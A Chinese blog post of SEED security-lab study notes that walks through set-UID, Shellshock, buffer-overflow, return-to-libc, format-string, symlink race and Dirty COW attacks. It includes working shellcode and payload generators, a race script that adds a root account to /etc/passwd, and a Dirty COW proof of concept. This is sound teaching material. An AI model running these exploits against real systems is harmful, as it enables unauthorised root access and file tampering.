---
title: seed
date: 2020-06-29 09:16:03
updated: 2020-07-02 08:45:30
tags:
    - seed
    - pwn
categories: 
	- 二进制安全
	- seed
use:
  - Valine
text: true
lazyload: true
count: true
---

# set-UID特权程序原理及攻击方法

1.linux中，密码存储在/etc/shadow中（只有root可修改）

2.特权程序两种常见存在方式：守护进程、set-UID程序

3.chown [file] [user] 改变文件所属权

4.set-UID主要攻击面：用户输入、能被用户左右的系统输入、环境变量

5.system():   ";"  可以执行多条语句(使用时需加引号："aa;/bin/sh")

6.execve()更安全一点

7.数据与代码分离原则、最小特权原则

# 通过环境变量实现攻击

1.环境变量造成的攻击面：链接器、程序库、外部程序、程序本身代码

2.静态链接（库函数实现副本包含在可执行文件里）与动态链接

3.ldd查看程序所依赖的共享库

4.LD_PRELOAD、LD_LIBRARY_PATH环境变量，可以在这里面找链接的函数（可能是用户自己写的函数）

5.PATH环境变量：当一个shell程序运行命令时，如果没有提供命令具体位置，shell将使用PATH环境变量来搜索命令。

# Shellshock攻击

```c
$ foo='() { echo "hello world"; }; echo "extra;'
$echo $foo
() { echo "hello world" };echo "extra";
$export foo
$bash_shellshock    //运行有漏洞的bash版本
extra                           //额外的命令被执行了
(child):$echo $foo

(child):$declare -f foo
foo()
{
    echo "hello world;
}
```

shellshock攻击需要满足两个：目标进程必须运行bash、攻击者只能通过环境变量把攻击数据传给目标进程

# 缓冲区溢出攻击

1.strcpy()函数复制字符串，遇到'\0'截断

2.关闭ASLR：`$sudo sysctl -w kernel.randomize_va_space=0`（2为开启）

3.`cat /proc/sys/kernel/randomize_va_space`  查看有没有开ASLR

4.`gcc -o stack -z execstack -fno-stack-protector stack.c` 

```c
/* Vunlerable program: stack.c */
/* You can get this program from the lab's website */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 * Suggested value: between 0 and 400  */
#ifndef BUF_SIZE
#define BUF_SIZE 24
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);       

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

     /* Change the size of the dummy array to randomize the parameters
       for this lab. Need to use the array at least once */
    char dummy[BUF_SIZE];  memset(dummy, 0, BUF_SIZE);

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

`-z execstack` 关闭栈上不可执行

`-fno-stack-protector` 关闭StackGuard

![image.png](https://i.loli.net/2020/11/17/iaEC1vrTBU8Ytk6.png)

5.测试ASLR

```c
#include<stdio.h>
void func(int* a1)
{
    printf(":: a1's address is 0x%x \n",(unsigned int) &a1);
}

int main()
{
    int x=3;
    func(&x);
    return 1;
}
```

![image.png](https://i.loli.net/2020/11/17/WTJh47PKxbGRN2q.png)

地址未发生变化

6.gdb调试下断点

![image.png](https://i.loli.net/2020/11/17/bO2F8In5LD46mAl.png)

![image.png](https://i.loli.net/2020/11/17/RLASdxNz6w4GiKg.png)

7.exploit

```python
#!/usr/bin/python3
import sys

shellcode= (
   "\x31\xc0"    # xorl    %eax,%eax
   "\x50"        # pushl   %eax
   "\x68""//sh"  # pushl   $0x68732f2f
   "\x68""/bin"  # pushl   $0x6e69622f
   "\x89\xe3"    # movl    %esp,%ebx
   "\x50"        # pushl   %eax
   "\x53"        # pushl   %ebx
   "\x89\xe1"    # movl    %esp,%ecx
   "\x99"        # cdq
   "\xb0\x0b"    # movb    $0x0b,%al
   "\xcd\x80"    # int     $0x80
).encode('latin-1')


# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

# Put the shellcode at the end
start = 517 - len(shellcode) 
content[start:] = shellcode

##################################################################
ret    = 0xffffdba0+100 # replace 0xAABBCCDD with the correct value
offset = 116            # replace 0 with the correct value

content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

8.构造shellcode：使用execve()系统调用执行"/bin/sh"

要用到四个寄存器：

eax：保存11（execve()的系统调用号）

ebx：保存命令字符串的地址（/bin/sh的地址）

ecx：保存参数数组的地址

edx：保存想要传给新程序的环境变量的地址。可以设置为0

shellcode：

```python
shellcode= (
   "\x31\xc0"    # xorl    %eax,%eax
   "\x50"        # pushl   %eax
   "\x68""//sh"  # pushl   $0x68732f2f
   "\x68""/bin"  # pushl   $0x6e69622f
   "\x89\xe3"    # movl    %esp,%ebx     #给%ebx赋值
   "\x50"        # pushl   %eax
   "\x53"        # pushl   %ebx
   "\x89\xe1"    # movl    %esp,%ecx     #给%ecx赋值
   "\x99"        # cdq                   #给%edx赋值
   "\xb0\x0b"    # movb    $0x0b,%al     #给%eax赋值
   "\xcd\x80"    # int     $0x80         #调用execve()
).encode('latin-1')
```

9.

`gcc -S xxx` 生成汇编代码

10.突破bash和dash的保护机制
通过设置uid为0：

```python
shellcode= (
   "\x31\xc0"    # xorl    %eax,%eax
   "\x31\xdb"    # xorl    %ebx,%ebx
   "\xb0\xd5"    # movb    $0xd5,%al
   "\xcd\x80"    # int     $0x80
    #setuid(0)
   "\x31\xc0"    # xorl    %eax,%eax
   "\x50"        # pushl   %eax
   "\x68""//sh"  # pushl   $0x68732f2f
   "\x68""/bin"  # pushl   $0x6e69622f
   "\x89\xe3"    # movl    %esp,%ebx     #给%ebx赋值
   "\x50"        # pushl   %eax
   "\x53"        # pushl   %ebx
   "\x89\xe1"    # movl    %esp,%ecx     #给%ecx赋值
   "\x99"        # cdq                   #给%edx赋值
   "\xb0\x0b"    # movb    $0x0b,%al     #给%eax赋值
   "\xcd\x80"    # int     $0x80         #调用execve()
).encode('latin-1')
```

# return-to-libc攻击

1.stack.c

```c
/* Vunlerable program: stack.c */
/* You can get this program from the lab's website */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 * Suggested value: between 0 and 400  */
#ifndef BUF_SIZE
#define BUF_SIZE 24
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);       

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

     /* Change the size of the dummy array to randomize the parameters
       for this lab. Need to use the array at least once */
    char dummy[BUF_SIZE];  memset(dummy, 0, BUF_SIZE);

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

2.编译

![image.png](https://i.loli.net/2020/11/17/LGn7JRezkOoZidb.png)



3.system地址

![image.png](https://i.loli.net/2020/11/17/LwXHuVCPonB2ir6.png)

4.字符串"/bin/sh"的地址

首先定义一个环境变量MYSHELL="/bin/sh"

```
export MYSHELL="/bin/sh"
```

删除时是`unset MYSHELL`

再打印地址

```c
#include<stdio.h>
#include<stdlib.h>

int main()
{
    char *shell=(char*)getenv("MYSHELL");
    if(shell)
    {
        printf("Value: %s\n",shell);
        printf("Address: %x\n",(unsigned int)shell);
    }
    return 1;
}
```

![image.png](https://i.loli.net/2020/11/17/JLS1suvj3Knp284.png)



5.system函数参数位置放哪（栈的哪里）

![image.png](https://i.loli.net/2020/11/17/vQU3s9ALyPphndj.png)查找偏移

```python
y#!/usr/bin/python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(517))

X = 44
sh_addr = 0xffffee5c      # The address of "/bin/sh"
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = 40
system_addr = 0xf7e3eda0  # The address of system()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = 36
exit_addr = 0xf7e329d0     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```

# 格式化字符串漏洞

vul.c

```c
#include<stdio.h>

void fmtstr()
{
    char input[100];
    int var=0x11223344;
    printf("Target address: %x\n",(unsigned) &var);
    printf("Data at target address: 0x%x\n",var);

    printf("Please enter a string: ");
    fgets(input,sizeof(input)-1,stdin);

    printf(input);
    printf("Data at target address: 0x%x\n",var);
}

void main()
{
    fmtstr();
}
```

2.使程序崩溃

![image.png](https://i.loli.net/2020/11/17/3GU5MY6dPIJQARH.png)

3.输出栈中数据

![image.png](https://i.loli.net/2020/11/17/ZD4quMFSiATwflm.png)

4.修改内存中的程序数据

%n->把目前已经打印出的字符个数写入内存

![image.png](https://i.loli.net/2020/11/17/KItbPTBL3ngSC41.png)

![image.png](https://i.loli.net/2020/11/17/DORLSoBzbMpyHGs.png)

5.修改程序数据为指定值

1）设置精度

![image.png](https://i.loli.net/2020/11/17/82gwWvH6AF9CYD4.png)

![image.png](https://i.loli.net/2020/11/17/TRJA4XsQ6k3CKDx.png)

2）%hn 2字节短整型数 %hhn 1字节字符型数

![image.png](https://i.loli.net/2020/11/17/x8a9krh7ZQB6jCV.png)

![image.png](https://i.loli.net/2020/11/17/nGbgVHqe2OAjRTx.png)``

![图片20200630135541.jpg](https://i.loli.net/2020/11/17/LwxTCGJEM6oBqVs.jpg)

k$直接选择第k个可变参数，

例：
`printf("%5$.20x%6$n\n",1,2,3,4,5,&var);`

# 竞争条件漏洞

```c
    /*  vulp.c  */
    #include<unistd.h>
    #include <stdio.h>
    #include<string.h>

    int main()
    {
       char * fn = "/tmp/XYZ";
       char buffer[60];
       FILE *fp;

       /* get user input */
       scanf("%50s", buffer );

       if(!access(fn, W_OK)){

            fp = fopen(fn, "a+");
            fwrite("\n", sizeof(char), 1, fp);
            fwrite(buffer, sizeof(char), strlen(buffer), fp);
            fclose(fp);
       }
       else printf("No permission \n");
    }
```

accsee()和fopen()函数之间有竞争条件问题。

首先禁用保护措施（限制一个程序是否可以使用一个全局可写目录中的符号链接）：

```
$sudo sysctl -w fs.protected_symlinks=0
```

passwd_input：

```
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
```

target_process.sh：

```bash
#!/bin/sh

while :
do
    ./vulp < passwd_input
done
```

attack_process.c：

```c
#include<unistd.h>

int main()
{
    while(1)
    {
        unlink("/tmp/XYZ");
        symlink("/dev/null","/tmp/XYZ");
        usleep(1000);

        unlink("/tmp/XYZ");
        symlink("/etc/passwd","/tmp/XYZ");
        usleep(1000);
    }
    return 0;
}
```

/dev/null是一个特殊设备，它对任何人都是可写的，写入其中的内容会被丢弃

修改后的target_process.sh：

```bash
#!/bin/sh

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while ["$old" == "$new"]  //检查是否被修改了
do
    ./vulp < passwd_input
    new=$($CHECK_FILE)
done
echo "STOP...The passwd file has been changed"
```

防御措施：原子操作、重复检查和使用、打开之前的保护措施（粘滞符号链接保护）、最小权限原则

seteuid(uid):设置当前进程的有效用户id

setuid(uid):设置当前进程的用户id

# 脏牛竞态条件攻击

1.mmap()系统调用来创建一个内存映射。

- 第一个参数指定内存映射的起始地址。如果为NULL则起始地址由内核决定
- 第二个参数指定内存映射大小
- 第三个参数指定内存是否可读或可写，需要和文件打开时的访问类型相匹配
- 第四个参数决定该映射内容的更新是否对其它映射到相同区域的进程可见，以及该更新是否进而导致映射的文件发生更新（MAP_SHARED\MAP_PRIVATE）
- 第五个参数指定哪个文件被映射
- 第六个参数指定一个偏移量，指出应该从文件哪个偏移开始映射。

一旦一个文件被映射到内存中，则可以通过读取和写入映射内存的方式来访问该文件。

2.MAP_SHARED：对于映射内存的修改会反映到物理内存中，因此这样的改动对其它同样映射了这个文件的进程立即可见

3.MAP_PRIVATE：修改时将原始内存中的内容复制到私有内存中。写时拷贝（COW）copy-on-write

4.在程序得到映射内存的私有拷贝之后，它可以使用一个名为madvise()的系统调用建议操作系统内核如何处理该内存

```
int madvise(void *addr,size_t length,int advice)
```

当使用MADV_DONTNEED作为第三个参数时，内核会释放该部分地址空间的资源，并更改进程页表

5.对于写时拷贝类型内存，write()需要三个步骤：

1）对映射的物理内存做一份拷贝

2）更新页表，让虚拟内存指向新创建的物理内存

3）写入内存

由于这几步不是原子化的，就造成了竞争条件

在步骤2-3之间使用madvise使其指向最开始的物理内存

6.cow_attack_passwd.c

需要在Ubuntu12.04环境下进行，16.04已修复

```c
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
  pthread_t pth1,pth2;
  struct stat st;
  int file_size;

  // Open the target file in the read-only mode.
  int f=open("/zzz", O_RDONLY);

  // Map the file to COW memory using MAP_PRIVATE.
  fstat(f, &st);
  file_size = st.st_size;
  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

  // Find the position of the target area
  char *position = strstr(map, "222222");                        

  // We have to do the attack using two threads.
  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
  pthread_create(&pth2, NULL, writeThread, position);             

  // Wait for the threads to finish.
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}

void *writeThread(void *arg)
{
  char *content= "******";
  off_t offset = (off_t) arg;

  int f=open("/proc/self/mem", O_RDWR);
  while(1) {
    // Move the file pointer to the corresponding position.
    lseek(f, offset, SEEK_SET);
    // Write to the memory.
    write(f, content, strlen(content));
  }
}

void *madviseThread(void *arg)
{
  int file_size = (int) arg;
  while(1){
      madvise(map, file_size, MADV_DONTNEED);
  }
}
```